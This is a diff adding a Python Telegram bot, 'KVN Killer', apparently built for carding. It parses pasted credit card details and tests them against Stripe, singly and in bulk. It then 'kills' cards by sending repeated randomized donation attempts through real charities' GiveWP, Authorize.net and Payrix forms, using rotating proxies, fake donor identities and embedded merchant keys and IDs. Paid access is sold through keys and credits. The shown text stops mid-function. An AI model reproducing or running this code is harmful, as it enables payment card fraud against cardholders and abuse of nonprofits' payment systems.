@@ -1,0 +1,1694 @@
+"""
+KVN Killer v3.0 FINAL — Ultra Edition (Railway Ready)
+- /kill  -> Donation Gateway Killer (Authorize.net + GiveWP + Payrix)
+- /chk   -> Stripe Auth Check (Single)
+- /mst   -> Stripe Auth Mass Check (15 workers, progress UI, channel hits)
+"""
+
+import asyncio
+import logging
+import os
+import re
+import sqlite3
+import random
+import string
+import time
+import json
+import threading
+from datetime import datetime, timedelta
+from typing import Optional, Dict, List, Tuple
+from bs4 import BeautifulSoup
+import aiohttp
+from aiohttp import web
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
+from telegram.constants import ParseMode
+
+# ═══════════════════════════════════════
+# CONFIG (Railway ENV)
+# ═══════════════════════════════════════
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+OWNER_ID = int(os.environ.get("OWNER_ID", 0))
+HIT_CHANNEL_ID = int(os.environ.get("HIT_CHANNEL_ID", 0))
+STRIPE_SK = os.environ.get("STRIPE_SK", "")
+
+MONGO_URI = os.environ.get("MONGO_URI", "")
+DB_NAME = os.environ.get("DB_NAME", "stresser_db")
+PROXY_COLLECTION = os.environ.get("PROXY_COLLECTION", "proxies")
+
+SITE_CONFIG = {
+    "base_url": "https://outbermuda.org/",
+    "form_id": "686",
+    "referer_base": "https://outbermuda.org/",
+    "auth_name": "43D8rvpNZ",
+    "auth_client_key": "4yLL27sQ9HhzpHLr27sgfUY4kp894PydK6v24NadbnpX9L4m43Vm4UCX2dwn7D7U",
+    "auth_id": "1dcaabea-fa2b-f4f8-631c-d335badfda3f",
+}
+
+PAYMENT_GATEWAYS = [
+    {"cid": "10334", "merchant": "p1_mer_66d212af800dc73de2ba7dd"},
+    {"cid": "1071", "merchant": "p1_mer_669024d6e619d1ab217503d"},
+    {"cid": "11488", "merchant": "p1_mer_66d2047bc7d50f8781e718d"},
+    {"cid": "11607", "merchant": "p1_mer_669033821d7a054a353b357"},
+    {"cid": "11674", "merchant": "p1_mer_6690210f7e21af07ed53a56"},
+    {"cid": "1177", "merchant": "p1_mer_66902775744ddec5a326b9a"},
+    {"cid": "1202", "merchant": "p1_mer_66d20c09f3a939e22ce38a9"},
+    {"cid": "12196", "merchant": "p1_mer_66d20ae66feda63af8d82ee"},
+    {"cid": "1230", "merchant": "p1_mer_6690282ba493094f251046a"},
+    {"cid": "12465", "merchant": "p1_mer_669028b79fe1716a9dd8804"},
+    {"cid": "13266", "merchant": "p1_mer_6690537c2d41ffed74ffecd"},
+    {"cid": "13372", "merchant": "p1_mer_669028c9e4d4a6e3b893c56"},
+    {"cid": "13429", "merchant": "p1_mer_66d207c90e53b855478fc36"},
+    {"cid": "13430", "merchant": "p1_mer_66d20a5f65471c1e94aee92"},
+    {"cid": "13440", "merchant": "p1_mer_66d2081286031a89b3c1b44"},
+    {"cid": "14138", "merchant": "p1_mer_66d205f4ab29724cef8de2e"},
+    {"cid": "14179", "merchant": "p1_mer_66d20c5d6d1a9d78a7d43d8"},
+    {"cid": "14225", "merchant": "p1_mer_66902179c94ff0e03437c1b"},
+    {"cid": "14245", "merchant": "p1_mer_66ad21126222709f81f0599"},
+    {"cid": "14259", "merchant": "p1_mer_66d209fce9d93b9615955cd"},
+    {"cid": "14322", "merchant": "p1_mer_66ad21126222709f81f0599"},
+    {"cid": "14349", "merchant": "p1_mer_6690260d9668ca03eb24c41"},
+    {"cid": "1454", "merchant": "p1_mer_66d20760b7fa378e43aef7e"},
+    {"cid": "1467", "merchant": "p1_mer_6690252033ed0d624b8d076"},
+    {"cid": "14692", "merchant": "p1_mer_66c778f4afcc3621c171e02"},
+    {"cid": "14866", "merchant": "p1_mer_66d20c184d303299114bde7"},
+    {"cid": "14884", "merchant": "p1_mer_66d20cf417b3b468afd637a"},
+    {"cid": "14893", "merchant": "p1_mer_66902690e4d66dcc4a06fea"},
+    {"cid": "14952", "merchant": "p1_mer_66d205f4ab29724cef8de2e"},
+    {"cid": "15029", "merchant": "p1_mer_66d20ba6ea0b2bb826de94d"},
+    {"cid": "15107", "merchant": "p1_mer_66d2055f509bf1982940ba3"},
+    {"cid": "15508", "merchant": "p1_mer_669025e76463f87012fe294"},
+    {"cid": "15523", "merchant": "p1_mer_66d20c26dd40ed50b6fa36e"},
+    {"cid": "15630", "merchant": "p1_mer_6644eb51e726bbf463a4476"},
+    {"cid": "15633", "merchant": "p1_mer_669025d4de98f58b3ba38ea"},
+    {"cid": "15709", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
+    {"cid": "15724", "merchant": "p1_mer_669021f7e934f033d1bc84f"},
+    {"cid": "15897", "merchant": "p1_mer_66d2129436ac351e493c45f"},
+    {"cid": "15901", "merchant": "p1_mer_66d2129436ac351e493c45f"},
+    {"cid": "15956", "merchant": "p1_mer_66e448ead64c11e731ca8e7"},
+    {"cid": "15982", "merchant": "p1_mer_66e448ead64c11e731ca8e7"},
+    {"cid": "16098", "merchant": "p1_mer_66d209372ccf9b98cc1803a"},
+    {"cid": "16232", "merchant": "p1_mer_66d212882cab6f5bb130a07"},
+    {"cid": "16285", "merchant": "p1_mer_66d2094580dfa382719e015"},
+    {"cid": "16291", "merchant": "p1_mer_66902690e4d66dcc4a06fea"},
+    {"cid": "16295", "merchant": "p1_mer_66d20859d77659a4b63fd21"},
+    {"cid": "16305", "merchant": "p1_mer_669020fab671c86f50f51a8"},
+    {"cid": "373", "merchant": "p1_mer_66902532a403c13c858d501"},
+    {"cid": "4450", "merchant": "p1_mer_669023101de0f6105e4417d"},
+    {"cid": "4942", "merchant": "p1_mer_66903c7408db001950fe873"},
+    {"cid": "566", "merchant": "p1_mer_66d2068e8b8cbee7c075b2a"},
+    {"cid": "6002", "merchant": "p1_mer_6690266e2b133b62945a047"},
+    {"cid": "8722", "merchant": "p1_mer_66d206b7aed53de56673f94"},
+]
+
+BANNED_BINS = {"535563", "543446", "532610", "485340", "531106", "494116", "516929", "435880", "517608", "416549"}
+
+# ═══════════════════════════════════════
+# LOGGING
+# ═══════════════════════════════════════
+logging.basicConfig(format="%(asctime)s — %(name)s — %(levelname)s — %(message)s", level=logging.INFO)
+logger = logging.getLogger("KVN-Killer")
+
+# ═══════════════════════════════════════
+# SQLITE
+# ═══════════════════════════════════════
+class UserDB:
+    def __init__(self, db_path: str = "killer_users.db"):
+        self.db_path = db_path
+        self._init()
+
+    def _init(self):
+        conn = sqlite3.connect(self.db_path, check_same_thread=False)
+        c = conn.cursor()
+        c.execute("""CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
+            plan_expiry TEXT, kill_credits INTEGER DEFAULT 0, check_count INTEGER DEFAULT 0,
+            kill_count INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0, is_admin INTEGER DEFAULT 0,
+            joined_at TEXT)""")
+        c.execute("""CREATE TABLE IF NOT EXISTS keys (
+            key_str TEXT PRIMARY KEY, days INTEGER, redeemed_by INTEGER, redeemed_at TEXT)""")
+        c.execute("""CREATE TABLE IF NOT EXISTS checks (
+            id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, cc TEXT,
+            result TEXT, gateway TEXT, checked_at TEXT)""")
+        conn.commit()
+        conn.close()
+
+    def _exec(self, query: str, params: tuple = ()) -> list:
+        conn = sqlite3.connect(self.db_path, check_same_thread=False)
+        c = conn.cursor()
+        c.execute(query, params)
+        result = c.fetchall()
+        conn.commit()
+        conn.close()
+        return result
+
+    def get_user(self, user_id: int) -> Optional[dict]:
+        rows = self._exec("SELECT * FROM users WHERE user_id = ?", (user_id,))
+        if not rows: return None
+        r = rows[0]
+        return {"user_id": r[0], "username": r[1], "first_name": r[2], "plan_expiry": r[3],
+                "kill_credits": r[4], "check_count": r[5], "kill_count": r[6],
+                "is_banned": r[7], "is_admin": r[8], "joined_at": r[9]}
+
+    def ensure_user(self, user_id: int, username: str = "", first_name: str = ""):
+        if not self.get_user(user_id):
+            self._exec("INSERT INTO users (user_id, username, first_name, plan_expiry, kill_credits, check_count, kill_count, is_banned, is_admin, joined_at) VALUES (?, ?, ?, ?, 0, 0, 0, 0, 0, ?)",
+                       (user_id, username, first_name, datetime.now().isoformat(), datetime.now().isoformat()))
+        else:
+            if username or first_name:
+                self._exec("UPDATE users SET username = ?, first_name = ? WHERE user_id = ?",
+                           (username, first_name, user_id))
+
+    def has_active_plan(self, user_id: int) -> bool:
+        user = self.get_user(user_id)
+        if not user or not user["plan_expiry"]: return False
+        try: return datetime.fromisoformat(user["plan_expiry"]) > datetime.now()
+        except: return False
+
+    def add_plan_days(self, user_id: int, days: int):
+        user = self.get_user(user_id)
+        base = datetime.now()
+        if user and user["plan_expiry"]:
+            try:
+                cur = datetime.fromisoformat(user["plan_expiry"])
+                if cur > base: base = cur
+            except: pass
+        self._exec("UPDATE users SET plan_expiry = ? WHERE user_id = ?", ((base + timedelta(days=days)).isoformat(), user_id))
+
+    def add_kill_credits(self, user_id: int, amount: int):
+        self._exec("UPDATE users SET kill_credits = kill_credits + ? WHERE user_id = ?", (amount, user_id))
+
+    def deduct_kill_credit(self, user_id: int) -> bool:
+        user = self.get_user(user_id)
+        if not user or user["kill_credits"] <= 0: return False
+        self._exec("UPDATE users SET kill_credits = kill_credits - 1, kill_count = kill_count + 1 WHERE user_id = ?", (user_id,))
+        return True
+
+    def increment_checks(self, user_id: int):
+        self._exec("UPDATE users SET check_count = check_count + 1 WHERE user_id = ?", (user_id,))
+
+    def ban(self, user_id: int): self._exec("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))
+    def unban(self, user_id: int): self._exec("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))
+    def is_banned(self, user_id: int) -> bool:
+        user = self.get_user(user_id)
+        return user["is_banned"] == 1 if user else False
+
+    def log_check(self, user_id: int, cc: str, result: str, gateway: str):
+        self._exec("INSERT INTO checks (user_id, cc, result, gateway, checked_at) VALUES (?, ?, ?, ?, ?)",
+                   (user_id, cc, result, gateway, datetime.now().isoformat()))
+
+    def get_stats(self) -> dict:
+        return {"users": self._exec("SELECT COUNT(*) FROM users")[0][0],
+                "checks": self._exec("SELECT COUNT(*) FROM checks")[0][0],
+                "lives": self._exec("SELECT COUNT(*) FROM checks WHERE result LIKE '%APPROVED%' OR result LIKE '%CHARGED%'")[0][0]}
+
+    def gen_key(self, days: int) -> str:
+        key = "KVN-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
+        self._exec("INSERT INTO keys (key_str, days, redeemed_by, redeemed_at) VALUES (?, ?, NULL, NULL)", (key, days))
+        return key
+
+    def redeem_key(self, key: str, user_id: int) -> Optional[int]:
+        rows = self._exec("SELECT days, redeemed_by FROM keys WHERE key_str = ?", (key,))
+        if not rows or rows[0][1] is not None: return None
+        self._exec("UPDATE keys SET redeemed_by = ?, redeemed_at = ? WHERE key_str = ?", (user_id, datetime.now().isoformat(), key))
+        self.add_plan_days(user_id, rows[0][0])
+        return rows[0][0]
+
+    def get_credits(self, user_id: int) -> int:
+        user = self.get_user(user_id)
+        return user["kill_credits"] if user else 0
+
+user_db = UserDB()
+
+# ═══════════════════════════════════════
+# MONGODB PROXIES
+# ═══════════════════════════════════════
+class ProxyRotator:
+    def __init__(self):
+        try:
+            import pymongo
+            self.client = pymongo.MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)
+            self.coll = self.client[DB_NAME][PROXY_COLLECTION]
+            self.coll.create_index("proxy_string", unique=True)
+            self.active = True
+            logger.info("✅ MongoDB connected — proxy collection ready")
+        except Exception as e:
+            logger.error(f"MongoDB fail: {e}")
+            self.active = False
+
+    def parse(self, proxy_str: str) -> dict:
+        parts = proxy_str.strip().split(":")
+        if len(parts) == 2:
+            h, p = parts
+            return {"raw": proxy_str, "url": f"http://{h}:{p}", "host": h, "port": p, "auth": None}
+        elif len(parts) == 4:
+            h, p, u, pw = parts
+            return {"raw": proxy_str, "url": f"http://{u}:{pw}@{h}:{p}", "host": h, "port": p, "auth": (u, pw)}
+        raise ValueError("bad format")
+
+    def add(self, proxy_str: str) -> bool:
+        if not self.active: return False
+        try:
+            p = self.parse(proxy_str)
+            self.coll.update_one({"proxy_string": p["raw"]},
+                                 {"$set": {"proxy_url": p["url"], "is_active": True, "fail_count": 0, "last_used": None}},
+                                 upsert=True)
+            return True
+        except Exception as e:
+            logger.error(f"Proxy add error: {e}")
+            return False
+
+    def get_random(self) -> Optional[dict]:
+        if not self.active: return None
+        try:
+            res = list(self.coll.aggregate([{"$match": {"is_active": True}}, {"$sample": {"size": 1}}]))
+            if res:
+                self.coll.update_one({"_id": res[0]["_id"]}, {"$set": {"last_used": datetime.now()}})
+                return {"url": res[0]["proxy_url"], "raw": res[0]["proxy_string"]}
+        except Exception as e:
+            logger.error(f"Proxy get error: {e}")
+        return None
+
+    def mark_failed(self, proxy_url: str):
+        if not self.active: return
+        self.coll.update_one({"proxy_url": proxy_url}, {"$inc": {"fail_count": 1}})
+        self.coll.update_one({"proxy_url": proxy_url, "fail_count": {"$gte": 3}}, {"$set": {"is_active": False}})
+
+    def list_all(self) -> List[dict]:
+        if not self.active: return []
+        return list(self.coll.find({}, {"_id": 0, "proxy_string": 1, "is_active": 1, "fail_count": 1}))
+
+    def delete_by_index(self, idx: int) -> bool:
+        if not self.active: return False
+        active = list(self.coll.find({"is_active": True}))
+        if 0 <= idx < len(active):
+            self.coll.delete_one({"_id": active[idx]["_id"]})
+            return True
+        return False
+
+    def count_active(self) -> int:
+        if not self.active: return 0
+        return self.coll.count_documents({"is_active": True})
+
+    def count_total(self) -> int:
+        if not self.active: return 0
+        return self.coll.count_documents({})
+
+proxy_rotator = ProxyRotator()
+
+# ═══════════════════════════════════════
+# STOP FLAGS
+# ═══════════════════════════════════════
+mass_stop_events: Dict[int, "MassCheckState"] = {}
+
+# ═══════════════════════════════════════
+# CC REGEX
+# ═══════════════════════════════════════
+CC_PATTERN = re.compile(
+    r"(?:(?:[/!.#]kill|/check)\s+)?" +
+    r"(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(?:20)?(\d{2})[|\s/:.-]+(\d{3,4})" +
+    r"|" +
+    r"(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(\d{4})[|\s/:.-]+(\d{3,4})" +
+    r"|" +
+    r"(\d{16})\D+?(\d{1,2})\D+?(\d{2,4})\D+?(\d{3,4})" +
+    r"|" +
+    r"(?:cc|card)[:\s]+(\d{16})[|\s/:.-]+(\d{1,2})[|\s/:.-]+(\d{2,4})[|\s/:.-]+(\d{3,4})" +
+    r"|" +
+    r"(?:card\s*number[:\s]*|cc[:\s]*)?(\d{4}[\s.-]?\d{4}[\s.-]?\d{4}[\s.-]?\d{4})[\s|/:.-]*(\d{1,2})[\s|/:.-]*(\d{2,4})[\s|/:.-]*(\d{3,4})" +
+    r"|" +
+    r"(\d{16})[\s]*exp[\s.-]*(\d{1,2})[\s/.-]*(\d{2,4})[\s]*cvv[\s]*(\d{3,4})" +
+    r"|" +
+    r"(\d{16})[\s]*(?:exp|expiry|expiration)[\s:.-]*(\d{1,2})/(\d{2,4})[\s]*(?:cvv|cvc|security)[\s:.-]*(\d{3,4})",
+    re.IGNORECASE
+)
+
+# ═══════════════════════════════════════
+# HELPERS
+# ═══════════════════════════════════════
+def extract_signatures(response_text: str) -> Tuple[Optional[str], Optional[str]]:
+    matches = re.findall(r"givewp-route-signature=([a-f0-9]+).*?givewp-route-signature-expiration=(\d+)", response_text)
+    return matches[0] if matches else (None, None)
+
+def generate_random_name():
+    f = random.choice(["John","Emma","Michael","Sarah","David","Lisa","James","Anna","Robert","Emily","Chris","Mia","Daniel","Sophia","Marcus","Olivia","Tyler","Ava","Kevin","Ella"])
+    l = random.choice(["Smith","Johnson","Brown","Taylor","Wilson","Davis","Clark","Lewis","Walker","Hall","Young","King","Wright","Lopez","Hill","Scott","Green","Adams","Baker","Nelson"])
+    return f, l
+
+def generate_random_phone():
+    return f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
+
+def generate_random_email(fn, ln):
+    d = random.choice(["gmail.com","yahoo.com","hotmail.com","outlook.com","icloud.com","proton.me"])
+    r = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4,7)))
+    return f"{fn.lower()}{ln.lower()}{r}@{d}"
+
+def generate_random_address():
+    s = random.choice(["Main","Park","Oak","Pine","Cedar","Elm","Washington","Lake","Hill","River","Spring","Maple"])
+    c = random.choice(["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","Dallas","Miami","Seattle","Denver","Boston","Atlanta"])
+    st_map = {"New York":"NY","Los Angeles":"CA","Chicago":"IL","Houston":"TX","Phoenix":"AZ","Philadelphia":"PA","Dallas":"TX","Miami":"FL","Seattle":"WA","Denver":"CO","Boston":"MA","Atlanta":"GA"}
+    st = st_map.get(c, "NY")
+    return f"{random.randint(1,999)} {s} St", c, st, str(random.randint(10000,99999))
+
+def get_form_headers():
+    return {
+        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
+        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
+        'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': '"Android"',
+        'Upgrade-Insecure-Requests': "1", 'Sec-Fetch-Site': "same-origin",
+        'Sec-Fetch-Mode': "navigate", 'Sec-Fetch-Dest': "iframe",
+        'Referer': SITE_CONFIG["referer_base"],
+    }
+
+def get_auth_headers():
+    return {
+        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
+        'Content-Type': "application/json", 'sec-ch-ua-platform': '"Android"',
+        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
+        'sec-ch-ua-mobile': "?1", 'Origin': SITE_CONFIG["base_url"],
+        'Sec-Fetch-Site': "cross-site", 'Sec-Fetch-Mode': "cors",
+        'Sec-Fetch-Dest': "empty", 'Referer': SITE_CONFIG["base_url"] + "/",
+    }
+
+def get_donation_headers():
+    return {
+        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
+        'Accept': "application/json", 'sec-ch-ua-platform': '"Android"',
+        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
+        'sec-ch-ua-mobile': "?1", 'Origin': SITE_CONFIG["base_url"],
+        'Sec-Fetch-Site': "same-origin", 'Sec-Fetch-Mode': "cors",
+        'Sec-Fetch-Dest': "empty",
+        'Referer': f"{SITE_CONFIG['base_url']}/?givewp-route=donation-form-view&form-id={SITE_CONFIG['form_id']}"
+    }
+
+async def bin_lookup(card_number: str, session: aiohttp.ClientSession, proxy_url: Optional[str] = None) -> dict:
+    try:
+        bn = card_number[:6]
+        kw = {"proxy": proxy_url} if proxy_url else {}
+        async with session.get(f"https://api.juspay.in/cardbins/{bn}",
+                               timeout=aiohttp.ClientTimeout(total=8), **kw) as resp:
+            if resp.status == 200:
+                d = await resp.json()
+                return {"brand": d.get("brand","Unknown"), "type": d.get("type","Unknown"),
+                        "sub_type": d.get("card_sub_type","Unknown"),
+                        "bank": d.get("bank","Unknown"), "country": d.get("country","Unknown"),
+                        "country_code": d.get("country_code","🌍")}
+    except Exception as e:
+        logger.error(f"BIN error: {e}")
+    return {"brand":"Unknown","type":"Unknown","sub_type":"Unknown","bank":"Unknown","country":"Unknown","country_code":"🌍"}
+
+def parse_cc(text: str) -> Optional[Tuple[str,str,str,str]]:
+    m = CC_PATTERN.search(text)
+    if not m: return None
+    groups = m.groups()
+    for i in range(0, len(groups), 4):
+        if groups[i]:
+            card, mm, yy, cvv = groups[i], groups[i+1], groups[i+2], groups[i+3]
+            mm = mm.zfill(2)
+            if len(yy) == 4: yy = yy[2:]
+            return card, mm, yy, cvv
+    return None
+
+# ═══════════════════════════════════════
+# MODULE 1: STRIPE AUTH CHECKER
+# ═══════════════════════════════════════
+class StripeChecker:
+    @staticmethod
+    async def check(card: str, mm: str, yy: str, cvv: str,
+                    session: aiohttp.ClientSession, proxy_url: Optional[str] = None) -> dict:
+        kw = {"proxy": proxy_url} if proxy_url else {}
+        headers = {"Authorization": f"Bearer {STRIPE_SK}", "Content-Type": "application/x-www-form-urlencoded"}
+        year_full = f"20{yy}" if len(yy) == 2 else yy
+        payload = {"type": "card", "card[number]": card, "card[exp_month]": mm,
+                   "card[exp_year]": year_full, "card[cvc]": cvv}
+        try:
+            async with session.post("https://api.stripe.com/v1/payment_methods", data=payload,
+                                    headers=headers, timeout=aiohttp.ClientTimeout(total=15), **kw) as resp:
+                data = await resp.json()
+            if resp.status == 200 and "id" in data:
+                return {"status": "APPROVED", "response": "Payment Method Added ✅",
+                        "gateway": "Stripe Auth", "amount": "0", "pm_id": data["id"]}
+            if "error" in data:
+                err = data["error"]
+                decline_code = err.get("decline_code", "unknown")
+                msg = err.get("message", "Card declined")
+                return {"status": "DECLINED", "response": msg, "gateway": "Stripe Auth",
+                        "amount": "0", "decline_code": decline_code}
+            return {"status": "ERROR", "response": "Unknown response", "gateway": "Stripe Auth", "amount": "0"}
+        except Exception as e:
+            return {"status": "ERROR", "response": str(e), "gateway": "Stripe Auth", "amount": "0"}
+
+# ═══════════════════════════════════════
+# MODULE 2: KILLER GATEWAY
+# ═══════════════════════════════════════
+class KillerGateway:
+    @staticmethod
+    async def donation_attempt(card_number: str, expiration: str, donation_params: dict,
+                                attempt_num: int, proxy_url: Optional[str] = None) -> bool:
+        req_id = f"Req-{attempt_num}-{random.randint(100,999)}"
+        kw = {"proxy": proxy_url} if proxy_url else {}
+        try:
+            cvv = str(random.randint(100,999))
+            amount = str(random.randint(200000, 200000))
+            fn, ln = generate_random_name()
+            phone = generate_random_phone()
+            email = generate_random_email(fn, ln)
+            a1, city, state, zc = generate_random_address()
+
+            auth_payload = {
+                "securePaymentContainerRequest": {
+                    "merchantAuthentication": {"name": SITE_CONFIG["auth_name"],
+                                                "clientKey": SITE_CONFIG["auth_client_key"]},
+                    "data": {"type": "TOKEN", "id": SITE_CONFIG["auth_id"],
+                             "token": {"cardNumber": card_number, "expirationDate": expiration, "cardCode": cvv}}
+                }
+            }
+            async with aiohttp.ClientSession() as s:
+                async with s.post("https://api2.authorize.net/xml/v1/request.api", json=auth_payload,
+                                  headers=get_auth_headers(), timeout=aiohttp.ClientTimeout(total=30), **kw) as resp:
+                    auth_text = (await resp.text()).lstrip('\ufeff')
+                    auth_data = json.loads(auth_text)
+
+                if auth_data.get("messages", {}).get("resultCode") != "Ok":
+                    return True
+
+                dd = auth_data.get("opaqueData", {}).get("dataDescriptor")
+                dv = auth_data.get("opaqueData", {}).get("dataValue")
+                if not dd or not dv:
+                    return True
+
+                donation_payload = {
+                    'amount': amount, 'currency': 'USD', 'donationType': 'single',
+                    'formId': SITE_CONFIG["form_id"], 'gatewayId': 'authorize',
+                    'firstName': fn, 'lastName': ln, 'email': email,
+                    'anonymous': 'false', 'comment': '', 'company': 'Neend gen', 'phone': phone,
+                    'country': 'US', 'address1': a1, 'address2': '', 'city': city,
+                    'state': state, 'zip': zc, 'originUrl': SITE_CONFIG["referer_base"],
+                    'gatewayData[give_authorize_data_descriptor]': dd,
+                    'gatewayData[give_authorize_data_value]': dv
+                }
+                async with s.post(SITE_CONFIG["base_url"], params=donation_params, data=donation_payload,
+                                  headers=get_donation_headers(), timeout=aiohttp.ClientTimeout(total=60), **kw) as resp:
+                    donation_data = await resp.json()
+                    return not donation_data.get("success", False)
+        except Exception as e:
+            logger.error(f"[{req_id}] Error: {e}")
+            return True
+
+    @staticmethod
+    async def payrix_check(card: str, mm: str, yy: str, cvv: str,
+                           proxy_url: Optional[str] = None) -> str:
+        kw = {"proxy": proxy_url} if proxy_url else {}
+        try:
+            gw = random.choice(PAYMENT_GATEWAYS)
+            cid, merchant = gw["cid"], gw["merchant"]
+            if cvv is None or cvv == "": cvv = str(random.randint(100,999))
+
+            h1 = {
+                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
+                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                'Cache-Control': "max-age=0",
+                'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
+                'sec-ch-ua-mobile': "?1", 'sec-ch-ua-platform': "\"Android\"",
+                'Upgrade-Insecure-Requests': "1", 'Sec-Fetch-Site': "cross-site",
+                'Sec-Fetch-Mode': "navigate", 'Sec-Fetch-User': "?1",
+                'Sec-Fetch-Dest': "document",
+                'Referer': "https://www.womensurgeons.org/donate-to-the-foundation",
+                'Accept-Language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6"
+            }
+            async with aiohttp.ClientSession() as s:
+                async with s.get("https://donate.givedirect.org", params={"cid": cid},
+                                 headers=h1, timeout=aiohttp.ClientTimeout(total=30), **kw) as resp:
+                    text = await resp.text()
+
+                soup = BeautifulSoup(text, 'html.parser')
+                el = soup.find('input', {'id': 'txnsession_key'})
+                if not el:
+                    return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗳𝗶𝗻𝗱 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"
+                try:
+                    txn_key = str(el).split('value="')[1].split('"')[0]
+                except:
+                    return "𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝗲𝘅𝘁𝗿𝗮𝗰𝘁 𝘁𝘅𝗻𝘀𝗲𝘀𝘀𝗶𝗼𝗻_𝗸𝗲𝘆"
+
+                h2 = {
+                    'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
+                    'Accept': "application/json, text/javascript, */*; q=0.01",
+                    'sec-ch-ua-platform': "\"Android\"",
+                    'sec-ch-ua': "\"Chromium\";v=\"134\", \"Not:A-Brand\";v=\"24\", \"Google Chrome\";v=\"134\"",
+                    'sec-ch-ua-mobile': "?1", 'x-requested-with': "XMLHttpRequest",
+                    'txnsessionkey': txn_key
+                }
+                payload = {
+                    'origin': "1", 'merchant': merchant, 'type': "2", 'total': "0",
+                    'description': "donate live site", 'payment[number]': card,
+                    'payment[cvv]': cvv, 'expiration': f"{mm}{yy}", 'zip': "", 'last': "Tech"
+                }
+                async with s.post("https://api.payrix.com/txns", data=payload, headers=h2,
+                                  timeout=aiohttp.ClientTimeout(total=10), **kw) as resp:
+                    j = await resp.json()
+                    errors = j['response']['errors']
+                    if errors:
+                        msg = errors[0]['msg']
+                        if "No 'To' Account Specified" in msg:
+                            return "𝗖𝗮𝗿𝗱 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱\n𝗥𝗲𝗮𝘀𝗼𝗻: 𝗡𝗼𝘁 𝗳𝗼𝘂𝗻𝗱, 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿"
+                        return msg
+                    return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
+        except Exception as e:
+            logger.error(f"Payrix error: {e}")
+            return "𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱"
+
+    @staticmethod
+    async def kill(card: str, mm: str, yy: str, cvv: str, proxy_url: Optional[str] = None) -> dict:
+        year_full = f"20{yy}" if len(yy) == 2 else yy
+        expiration = f"{mm}{year_full[-2:]}"
+        try:
+            form_params = {'givewp-route': "donation-form-view", 'form-id': SITE_CONFIG["form_id"]}
+            kw = {"proxy": proxy_url} if proxy_url else {}
+            async with aiohttp.ClientSession() as s:
+                async with s.get(SITE_CONFIG["base_url"], params=form_params, headers=get_form_headers(),
+                                 timeout=aiohttp.ClientTimeout(total=30), **kw) as resp:
+                    sig, exp_t = extract_signatures(await resp.text()) if resp.status == 200 else (None, None)
+            if not sig or not exp_t:
+                return {"status": "ERROR", "response": "Form signature missing", "gateway": "Killer",
+                        "killer_status": "Error ❌"}
+
+            donation_params = {
+                'givewp-route': "donate", 'givewp-route-signature': sig,
+                'givewp-route-signature-id': "givewp-donate",
+                'givewp-route-signature-expiration': exp_t
+            }
+            tasks = [KillerGateway.donation_attempt(card, expiration, donation_params, i+1, proxy_url)
+                     for i in range(5)]
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            results = [r if isinstance(r, bool) else True for r in results]
+            declined = sum(1 for r in results if r is True)
+            is_killed = (declined == 5)
+            killer_status = "KILLED ✅" if is_killed else "Maybe Live? 🤔"
+
+            payrix_result = await KillerGateway.payrix_check(card, mm, yy, cvv, proxy_url)
+            return {"status": "KILLED" if is_killed else "LIVE",
+                    "response": payrix_result, "gateway": "Killer",
+                    "killer_status": killer_status}
+        except Exception as e:
+            return {"status": "ERROR", "response": str(e), "gateway": "Killer",
+                    "killer_status": "Error ❌"}
+
+# ═══════════════════════════════════════
+# UI / FORMATTERS
+# ═══════════════════════════════════════
+def sep_mid() -> str:
